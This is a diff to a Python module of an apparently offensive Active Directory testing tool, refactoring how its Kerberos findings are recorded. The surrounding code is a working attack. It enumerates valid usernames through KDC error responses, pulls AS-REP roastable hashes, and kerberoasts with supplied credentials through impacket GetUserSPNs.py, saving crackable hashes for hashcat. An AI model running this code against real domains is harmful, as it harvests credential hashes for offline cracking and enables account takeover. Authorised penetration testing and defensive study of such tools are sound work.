@@ -6,7 +6,7 @@ AS-REP roasting — no credentials needed.
 Authenticated:   kerberoasting with any supplied --ad-user/--ad-pass/--nthash
 credentials via impacket GetUserSPNs.py — crackable TGS hashes (hashcat -m
 13100) dumped to evidence."""
-from core.database import Finding
+from core import proof as P
 from core.crypto_mini import (build_as_req, send_kdc, krb_error_code,
                               as_rep_cipher, asrep_hashcat_line)
 
@@ -77,7 +77,7 @@ def run(engine):
     if valid:
         listing = "\n".join(valid[:200])
         extra = "" if len(valid) <= 200 else "\n... (%d total)" % len(valid)
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "recon", "medium",
             "Kerberos user enumeration: %d VALID usernames via KDC error "
             "differentiation" % len(valid),
@@ -86,7 +86,7 @@ def run(engine):
             evidence=listing + extra,
             remediation="This is protocol behaviour; monitor KDC for "
                         "enumeration patterns.",
-            confidence="firm"))
+            cls="ad", proof=P.marker(", ".join(valid[:8])))
         engine.log.finding("[kerb] %d valid usernames" % len(valid))
         engine.state.setdefault("ad_users", valid)
 
@@ -100,7 +100,7 @@ def run(engine):
                                           "\n".join(lines))
         except Exception:
             pass
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "exploit-proof", "critical",
             "[VERIFIED] AS-REP ROASTABLE accounts: %d" % len(roastable),
             detail="Accounts with 'Do not require Kerberos preauth' returned "
@@ -108,7 +108,8 @@ def run(engine):
                    "18200.%s" % ("\nSaved to %s" % ev_rel if ev_rel else ""),
             evidence="\n".join(l[:160] + "…" for l in lines[:6]),
             remediation="Enable preauth for these accounts; rotate their "
-                        "passwords.", confidence="firm"))
+                        "passwords.",
+            cls="ad", proof=P.extraction(lines[0][:120]))
 
     _try_kerberoast(engine, realm, kdc)
 
@@ -124,13 +125,14 @@ def _try_kerberoast(engine, realm, kdc):
     t = engine.target
     tool = which_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
     if not tool:
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "coverage", "info",
             "Kerberoasting unavailable (impacket GetUserSPNs.py missing)",
             detail="With any valid domain credential VAJRA requests service "
                    "tickets and dumps crackable TGS hashes (hashcat -m "
                    "13100). Offline on this operator host.",
-            confidence="firm"))
+            cls="ad_misconfig", proof=P.observation(
+                "impacket GetUserSPNs.py missing"))
         return
     nthash = creds.get("nthash") or ""
     auth = "%s\\%s" % (realm, user) if nthash else \
@@ -145,9 +147,10 @@ def _try_kerberoast(engine, realm, kdc):
         out = subprocess.run(args, capture_output=True, text=True,
                              input="N\n", timeout=90)
     except Exception as e:
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "coverage", "info",
-            "Kerberoast run failed: %r" % e, confidence="possible"))
+            "Kerberoast run failed: %r" % e, cls="ad_misconfig",
+            proof=P.observation("kerberoast subprocess failed"))
         return
     text = (out.stdout or "") + "\n" + (out.stderr or "")
     hashes = [ln.strip() for ln in text.splitlines() if "$krb5tgs$" in ln]
@@ -161,7 +164,7 @@ def _try_kerberoast(engine, realm, kdc):
                                           "\n".join(hashes))
         except Exception:
             pass
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "exploit-proof", "critical",
             "[VERIFIED] %d KERBEROASTABLE SPN accounts (auth)"
             % len(hashes),
@@ -171,21 +174,23 @@ def _try_kerberoast(engine, realm, kdc):
             evidence="\n".join(h[:160] + "…" for h in hashes[:6]),
             remediation="Rotate SPN account passwords; never reuse the "
                         "machine account password as a service credential.",
-            confidence="firm"))
+            cls="ad", proof=P.extraction(hashes[0][:120]))
         engine.log.finding("[kerb] %d kerberoastable SPNs (auth)" % len(hashes))
     elif rejected:
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "recon", "info",
             "Kerberoasting: supplied credentials rejected by KDC",
             detail=text[-400:] or "KDC refused the AS/TGS exchange",
-            confidence="firm"))
+            cls="ad_misconfig", proof=P.observation(
+                "credentials rejected by KDC"))
     else:
-        engine.db.add_finding(Finding(
+        engine.record(
             t.display, "ad.kerberos", "coverage", "info",
             "Kerberoasting: no harvestable SPN tickets returned",
             detail=("Command completed but produced no TGS hashes%s"
                     % ("\n" + text[-300:] if text else "")),
-            confidence="possible"))
+            cls="ad_misconfig", proof=P.observation(
+                "no TGS hashes returned"))
 
 
 def guess_realm(t):
